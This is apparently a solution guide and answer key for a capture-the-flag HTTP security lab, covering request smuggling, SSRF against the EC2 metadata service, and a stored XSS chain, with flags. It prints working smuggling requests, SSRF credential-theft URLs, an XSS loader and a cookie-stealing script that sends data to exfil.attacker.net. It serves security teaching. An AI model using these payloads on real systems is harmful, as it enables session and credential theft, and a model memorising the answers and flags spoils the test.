# Scaler — HTTP Protocol Security Lab: Complete Solution Guide

---

## Scenario 01: CL.TE Request Smuggling via Proxy Desync

### Objective
Identify the full path and query string of the smuggled request that the origin server processes independently from the desync buffer.

### Background
The infrastructure uses a CDN proxy (CloudEdge) and an origin server (nginx + uWSGI). They disagree on how to determine request body length:

- **Proxy (CloudEdge):** Uses `Content-Length: 78` — reads exactly 78 bytes as the body and forwards everything as a single request.
- **Origin (nginx):** Uses `Transfer-Encoding: chunked` — reads chunks until a terminal `0` chunk, then treats any remaining bytes in the TCP buffer as a **new, independent request**.

### Analysis

The captured raw request contains both headers:

```
POST /api/checkout HTTP/1.1
Host: shop.megacorp.internal
Content-Length: 78
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /admin/export-users?format=csv HTTP/1.1
Host: shop.megacorp.internal
X-Forwarded-For: 127.0.0.1
```

**Proxy parse (Content-Length: 78):**
- Reads 78 bytes of body: `"0\r\n\r\nGET /admin/export-users?format=csv HTTP/1.1\r\nHost: shop.megacorp.internal\r\n"`
- Sees **one request**, forwards it all to the origin.

**Origin parse (Transfer-Encoding: chunked):**
- Reads chunk size `0` → terminal chunk → body ends immediately.
- The remaining bytes (`GET /admin/export-users?format=csv HTTP/1.1...`) are left in the connection buffer.
- Origin parses these leftover bytes as a **second, independent request** on the same keep-alive connection.

The smuggled request is the `GET` request that only the origin sees.

### Answer

```
/admin/export-users?format=csv
```

### Accepted Variations
- `/admin/export-users?format=csv`
- `GET /admin/export-users?format=csv`
- `https://shop.megacorp.internal/admin/export-users?format=csv`

Any input containing both `/admin/export-users` and `format=csv` is accepted (case-insensitive).

### Flag

```
Flag{Scaler_CL_TE_D3SYNC_8X01}
```

---

## Scenario 02: Response Queue Poisoning via TE.CL Desync

### Objective
Identify the HTTP method and path that the backend (Apache) parses from the leftover TCP buffer as a smuggled request.

### Background
This is a **TE.CL** desync — the reverse of Scenario 01:

- **Proxy (HAProxy):** Prioritizes `Transfer-Encoding: chunked` — reads the full chunked body.
- **Backend (Apache):** Prioritizes `Content-Length: 4` — reads only 4 bytes as the body.

### Analysis

The attacker's crafted request:

```
POST /search HTTP/1.1
Host: portal.acmefinance.io
Content-Length: 4
Transfer-Encoding: chunked

8b
GET /login HTTP/1.1
Host: portal.acmefinance.io
Content-Length: 0

HTTP/1.1 301 Moved Permanently
Location: https://evil-phish.com/login

0

```

**HAProxy parse (Transfer-Encoding: chunked):**
- Chunk 1: size `0x8b` = 139 bytes (the smuggled content).
- Chunk 2: size `0` = terminal chunk.
- HAProxy sees **one request** (POST /search) and forwards everything to Apache.

**Apache parse (Content-Length: 4):**
- Reads exactly 4 bytes as the body: `"8b\r\n"` (the chunk size line = 2 chars + CRLF).
- The POST /search request is complete.
- **Everything remaining** in the TCP buffer is parsed as a new request:

```
GET /login HTTP/1.1
Host: portal.acmefinance.io
Content-Length: 0
...
```

This smuggled `GET /login` request, combined with the injected fake `301` response, poisons the Varnish cache. All subsequent users requesting `/login` receive the cached redirect to `evil-phish.com/login` for the duration of the cache TTL (300 seconds).

### Answer

```
GET /login
```

### Accepted Variations
- `GET /login`
- `get /login`
- `GET  /login` (extra spaces)

Any input containing both `get` and `/login` (but not `/search`) is accepted.

### Flag

```
Flag{Scaler_TE_CL_P01S0N_9V42}
```

---

## Scenario 03: SSRF to Cloud Credential Theft to Database Exfiltration

### Objective
Identify the IP address of the EC2 Instance Metadata Service (IMDS) endpoint that the attacker targeted through the SSRF vulnerability.

### Background
The attacker exploited a Server-Side Request Forgery (SSRF) in CloudNova's webhook integration feature. The `url` parameter in `POST /api/integrations/webhook` is user-controlled and the server fetches whatever URL is provided without validation.

### Analysis

The attack chain visible in the application logs:

1. **Reconnaissance:** Attacker sends `url=http://169.254.169.254/latest/meta-data/` — receives directory listing of EC2 metadata categories.
2. **IAM Discovery:** Attacker sends `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` — receives the IAM role name: `CloudNova-WebApp-Role`.
3. **Credential Theft:** Attacker sends `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/CloudNova-WebApp-Role` — receives temporary AWS credentials (AccessKeyId, SecretAccessKey, Token).

The IP `169.254.169.254` is the **AWS EC2 Instance Metadata Service (IMDS)**. It is a link-local address available to every EC2 instance and provides instance metadata including IAM role credentials. Because IMDSv1 was enabled (no token required), a simple HTTP GET is sufficient to retrieve credentials.

**Post-compromise (from CloudTrail):**
4. Attacker uses stolen credentials with AWS CLI to call `GetCallerIdentity`, confirming access.
5. Attacker enumerates RDS instances, finds the production PostgreSQL database.
6. Attacker generates an IAM auth token for database access.
7. Attacker dumps the database and uploads it to S3 (`users_dump.sql.gz`, 142MB).

### Answer

```
169.254.169.254
```

### Accepted Variations
- `169.254.169.254`
- `http://169.254.169.254`
- `http://169.254.169.254/latest/meta-data/`

Any input that resolves to `169.254.169.254` after stripping protocol and path is accepted.

### Flag

```
Flag{Scaler_SSRF_1MDS_M3TA_7K93}
```

---

## Scenario 04: Stored XSS to Admin Session Hijack to Backdoor Account Creation

### Objective
Identify the exact domain to which the stolen session cookie was exfiltrated.

### Background
A multi-stage attack:
1. Attacker (j.smith) plants a stored XSS payload in a task description field.
2. When the admin views the task, the XSS loads an external script from an attacker-controlled S3 bucket.
3. The script steals the admin's session cookie and sends it to a collection server.
4. The attacker reuses the stolen session to access admin functions and create backdoor accounts.

### Analysis

**Stage 1 — XSS Payload (in task #4721):**
```html
<img src=x onerror="
  var s=document.createElement('script');
  s.src='https://cdn-analytics.s3.amazonaws.com/t.js';
  document.head.appendChild(s);
">
```
This loads the external script `t.js` from `cdn-analytics.s3.amazonaws.com`. Note: this is the **hosting** domain for the script, not the exfiltration destination.

**Stage 2 — Exfiltration Script (t.js):**
```javascript
(function() {
  var cookie = document.cookie;
  var payload = btoa(
    JSON.stringify({"c": cookie, "u": window.location.href, "t": Date.now()})
  );
  new Image().src = 'https://exfil.attacker.net/collect?d=' + payload;
})();
```

The script:
- Reads `document.cookie` (possible because HttpOnly flag was not set).
- Base64-encodes the cookie along with the current URL and timestamp.
- Sends it to `https://exfil.attacker.net/collect?d=...` via an Image beacon (invisible to the user).

The **exfiltration domain** is `exfil.attacker.net` — this is where the stolen cookie data is sent.

**Important distinction:**
- `cdn-analytics.s3.amazonaws.com` = where the malicious script is **hosted**
- `exfil.attacker.net` = where the stolen data is **sent**

**Stage 3 — Session Hijack:**
- Attacker uses the stolen `sess_adm_8f3a9c2b` session from IP `45.33.32.156` (different from admin's IP `10.0.2.15`).
- Accesses `/admin/dashboard`, `/admin/users`, then creates two backdoor accounts (`svc-backup`, `debug-agent`) with `super_admin` role.

### Answer

```
exfil.attacker.net
```

### Accepted Variations
- `exfil.attacker.net`
- `https://exfil.attacker.net`
- `https://exfil.attacker.net/collect`

Any input that resolves to `exfil.attacker.net` after stripping protocol and path is accepted.

### Flag

```
Flag{Scaler_XSS_S3SS10N_CH41N_2F58}
```

---

## Flag Summary

| Scenario | Answer | Flag |
|----------|--------|------|
| 01 — CL.TE Desync | `/admin/export-users?format=csv` | `Flag{Scaler_CL_TE_D3SYNC_8X01}` |
| 02 — TE.CL Cache Poison | `GET /login` | `Flag{Scaler_TE_CL_P01S0N_9V42}` |
| 03 — SSRF Chain | `169.254.169.254` | `Flag{Scaler_SSRF_1MDS_M3TA_7K93}` |
| 04 — XSS Hijack Chain | `exfil.attacker.net` | `Flag{Scaler_XSS_S3SS10N_CH41N_2F58}` |
